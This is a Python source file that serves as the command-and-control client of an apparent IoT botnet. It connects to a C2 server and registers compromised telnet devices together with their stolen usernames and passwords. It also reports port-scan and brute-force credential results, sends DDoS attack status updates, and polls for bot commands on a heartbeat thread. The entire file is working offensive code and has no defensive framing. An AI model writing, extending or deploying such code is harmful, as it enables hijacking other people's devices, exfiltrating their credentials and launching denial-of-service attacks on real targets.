#!/usr/bin/env python3
"""
C2 Communication Module for Exploit
Handles communication with the C2 server
"""

import socket
import json
import time
import threading
from typing import Dict, List, Optional, Any

class C2Client:
    def __init__(self, c2_host: str = "127.0.0.1", c2_port: int = 8080):
        """
        Initialize C2 client
        
        Args:
            c2_host: C2 server hostname/IP
            c2_port: C2 server port
        """
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.socket = None
        self.connected = False
        self.authenticated = False
        self.session_id = None
    
    def connect(self) -> bool:
        """
        Connect to C2 server
        
        Returns:
            True if connected successfully, False otherwise
        """
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((self.c2_host, self.c2_port))
            self.connected = True
            
            print(f"[+] Connected to C2 server at {self.c2_host}:{self.c2_port}")
            return True
            
        except Exception as e:
            print(f"[-] Failed to connect to C2 server: {e}")
            self.connected = False
            return False
    
    def disconnect(self):
        """Disconnect from C2 server"""
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        
        self.connected = False
        self.authenticated = False
        self.session_id = None
        print("[+] Disconnected from C2 server")
    
    def send_message(self, message: Dict) -> Optional[Dict]:
        """
        Send message to C2 server and get response
        
        Args:
            message: Message dictionary to send
        
        Returns:
            Response dictionary or None if failed
        """
        if not self.connected:
            print("[-] Not connected to C2 server")
            return None
        
        try:
            # Send message
            message_json = json.dumps(message)
            self.socket.send(message_json.encode('utf-8'))
            
            # Receive response
            response_data = self.socket.recv(4096).decode('utf-8')
            response = json.loads(response_data)
            
            return response
            
        except Exception as e:
            print(f"[-] Error communicating with C2 server: {e}")
            self.connected = False
            return None
    
    def register_bot(self, bot_ip: str, username: str, password: str, 
                    device_type: str = "unknown") -> bool:
        """
        Register a compromised bot with C2 server
        
        Args:
            bot_ip: IP address of compromised device
            username: Login username
            password: Login password
            device_type: Type of device
        
        Returns:
            True if registration successful, False otherwise
        """
        message = {
            "type": "register",
            "bot_ip": bot_ip,
            "username": username,
            "password": password,
            "device_type": device_type,
            "timestamp": time.time()
        }
        
        response = self.send_message(message)
        
        if response and response.get("status") == "success":
            print(f"[+] Bot {bot_ip} registered successfully")
            return True
        else:
            error_msg = response.get("message", "Unknown error") if response else "No response"
            print(f"[-] Failed to register bot {bot_ip}: {error_msg}")
            return False
    
    def send_heartbeat(self) -> Optional[Dict]:
        """
        Send heartbeat to C2 server
        
        Returns:
            Response with any pending commands
        """
        message = {
            "type": "heartbeat",
            "timestamp": time.time()
        }
        
        response = self.send_message(message)
        
        if response and response.get("status") == "success":
            return response
        else:
            print("[-] Heartbeat failed")
            return None
    
    def send_scan_results(self, results: List[Dict]) -> bool:
        """
        Send network scan results to C2 server
        
        Args:
            results: List of scan result dictionaries
        
        Returns:
            True if sent successfully, False otherwise
        """
        message = {
            "type": "scan_result",
            "results": results,
            "timestamp": time.time()
        }
        
        response = self.send_message(message)
        
        if response and response.get("status") == "success":
            print(f"[+] Sent {len(results)} scan results to C2 server")
            return True
        else:
            error_msg = response.get("message", "Unknown error") if response else "No response"
            print(f"[-] Failed to send scan results: {error_msg}")
            return False
    
    def send_credential_results(self, results: List[Dict]) -> bool:
        """
        Send credential brute force results to C2 server
        
        Args:
            results: List of credential attempt results
        
        Returns:
            True if sent successfully, False otherwise
        """
        message = {
            "type": "credential_result",
            "results": results,
            "timestamp": time.time()
        }
        
        response = self.send_message(message)
        
        if response and response.get("status") == "success":
            successful_count = len([r for r in results if r['success']])
            print(f"[+] Sent {len(results)} credential results to C2 server")
            print(f"[+] {successful_count} successful logins reported")
            return True
        else:
            error_msg = response.get("message", "Unknown error") if response else "No response"
            print(f"[-] Failed to send credential results: {error_msg}")
            return False
    
    def send_ddos_status(self, attack_id: int, status: str, details: Dict = None) -> bool:
        """
        Send DDoS attack status update to C2 server
        
        Args:
            attack_id: Attack ID
            status: Current status (started, running, stopped, failed)
            details: Additional status details
        
        Returns:
            True if sent successfully, False otherwise
        """
        message = {
            "type": "ddos_status",
            "attack_id": attack_id,
            "status": status,
            "details": details or {},
            "timestamp": time.time()
        }
        
        response = self.send_message(message)
        
        if response and response.get("status") == "success":
            print(f"[+] DDoS status update sent: Attack {attack_id} - {status}")
            return True
        else:
            error_msg = response.get("message", "Unknown error") if response else "No response"
            print(f"[-] Failed to send DDoS status: {error_msg}")
            return False
    
    def get_bot_commands(self) -> List[Dict]:
        """
        Get pending commands for this bot
        
        Returns:
            List of pending commands
        """
        response = self.send_heartbeat()
        
        if response:
            return response.get("commands", [])
        else:
            return []

class C2Communications:
    """
    High-level C2 communications handler
    """
    
    def __init__(self, c2_host: str = "127.0.0.1", c2_port: int = 8080):
        self.client = C2Client(c2_host, c2_port)
        self.auto_report = True
        self.report_thread = None
        self.running = False
    
    def start(self) -> bool:
        """Start C2 communications"""
        if self.client.connect():
            self.running = True
            
            # Start auto-reporting thread
            if self.auto_report:
                self.report_thread = threading.Thread(
                    target=self._auto_report_loop,
                    daemon=True
                )
                self.report_thread.start()
            
            return True
        else:
            return False
    
    def stop(self):
        """Stop C2 communications"""
        self.running = False
        self.client.disconnect()
    
    def report_scan_results(self, results: List[Dict]) -> bool:
        """Report scan results to C2"""
        if not self.client.connected:
            print("[-] Not connected to C2 server")
            return False
        
        # Filter for open ports only to reduce traffic
        open_ports = [r for r in results if r.get('status') == 'open']
        
        if open_ports:
            return self.client.send_scan_results(open_ports)
        else:
            print("[*] No open ports to report")
            return True
    
    def report_credentials(self, results: List[Dict]) -> bool:
        """Report credential results to C2"""
        if not self.client.connected:
            print("[-] Not connected to C2 server")
            return False
        
        return self.client.send_credential_results(results)
    
    def register_compromised_devices(self, successful_logins: List[Dict]) -> int:
        """
        Register all successfully compromised devices
        
        Args:
            successful_logins: List of successful login results
        
        Returns:
            Number of devices successfully registered
        """
        if not self.client.connected:
            print("[-] Not connected to C2 server")
            return 0
        
        registered_count = 0
        
        for login in successful_logins:
            if login.get('success'):
                success = self.client.register_bot(
                    login['ip'],
                    login['username'],
                    login['password'],
                    "telnet_device"
                )
                
                if success:
                    registered_count += 1
        
        print(f"[+] Registered {registered_count}/{len(successful_logins)} compromised devices")
        return registered_count
    
    def _auto_report_loop(self):
        """Auto-reporting background thread"""
        while self.running:
            try:
                # Send periodic heartbeat
                self.client.send_heartbeat()
                
                # Sleep for 30 seconds
                for _ in range(30):
                    if not self.running:
                        break
                    time.sleep(1)
                    
            except Exception as e:
                print(f"[-] Error in auto-report loop: {e}")
                time.sleep(10)
    
    def is_connected(self) -> bool:
        """Check if connected to C2 server"""
        return self.client.connected

# Utility functions for easy integration
def quick_connect_c2(host: str = "127.0.0.1", port: int = 8080) -> Optional[C2Communications]:
    """
    Quick connect to C2 server
    
    Args:
        host: C2 server host
        port: C2 server port
    
    Returns:
        C2Communications instance if successful, None otherwise
    """
    c2_comm = C2Communications(host, port)
    
    if c2_comm.start():
        print(f"[+] Connected to C2 server at {host}:{port}")
        return c2_comm
    else:
        print(f"[-] Failed to connect to C2 server at {host}:{port}")
        return None

def report_to_c2(scan_results: List[Dict] = None, 
                credential_results: List[Dict] = None,
                c2_host: str = "127.0.0.1", 
                c2_port: int = 8080) -> bool:
    """
    Quick function to report results to C2 server
    
    Args:
        scan_results: Network scan results
        credential_results: Credential brute force results
        c2_host: C2 server host
        c2_port: C2 server port
    
    Returns:
        True if all reports sent successfully, False otherwise
    """
    c2_comm = quick_connect_c2(c2_host, c2_port)
    
    if not c2_comm:
        return False
    
    success = True
    
    try:
        # Report scan results
        if scan_results:
            if not c2_comm.report_scan_results(scan_results):
                success = False
        
        # Report credential results
        if credential_results:
            if not c2_comm.report_credentials(credential_results):
                success = False
            
            # Register successful logins as bots
            successful_logins = [r for r in credential_results if r.get('success')]
            if successful_logins:
                c2_comm.register_compromised_devices(successful_logins)
        
    finally:
        c2_comm.stop()
    
    return success

if __name__ == "__main__":
    # Test C2 communication
    c2_comm = quick_connect_c2()
    
    if c2_comm:
        print("[+] C2 communication test successful")
        
        # Test heartbeat
        response = c2_comm.client.send_heartbeat()
        print(f"[+] Heartbeat response: {response}")
        
        c2_comm.stop()
    else:
        print("[-] C2 communication test failed")
